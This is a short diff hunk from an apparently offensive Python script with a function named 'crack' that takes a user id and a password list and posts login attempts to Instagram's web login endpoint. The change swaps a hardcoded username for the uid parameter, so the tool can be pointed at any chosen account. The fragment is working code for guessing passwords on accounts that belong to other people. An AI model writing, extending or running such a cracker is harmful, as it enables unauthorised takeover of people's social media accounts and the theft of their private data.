@@ -146,7 +146,7 @@ def crack(uid, password_list, total_count):
             'optIntoOneTap': 'true',
             'queryParams': '{"oneTapUsers":"[\\"65945188004\\"]"}',
             'trustedDeviceRecords': '{}',
-            'username': '8918929941',
+            'username': uid,
             'jazoest': '23031',}
             # Make API request
             response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
